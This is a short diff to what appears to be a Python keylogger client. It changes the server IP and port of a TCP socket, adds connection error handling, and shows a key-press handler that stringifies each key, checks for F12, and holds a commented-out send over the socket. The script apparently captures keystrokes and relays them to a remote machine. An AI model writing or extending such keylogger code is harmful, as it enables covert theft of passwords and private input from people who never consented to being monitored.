@@ -7,12 +7,18 @@ import os
 
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-serverParent = '192.168.1.22'
-serverPort = 8000
-clientSocket.connect((serverParent, serverPort))
+serverParent = '192.168.1.10'
+serverPort = 8080
+try:
+    clientSocket.connect((serverParent, serverPort))
+except Exception as e:
+    print("Error connecting to server:", str(e))
+if clientSocket:
+    print("connecting to server")
 
 def on_press(key):
     try:
+        # clientSocket.send("hehe")
         key = str(key)
         key = key.replace("'", "")
         if key == "Key.f12":
@@ -37,3 +43,5 @@ with Listener(on_press=on_press) as parent:
     finally:
         parent.stop()
         parent.join()
+        
+        
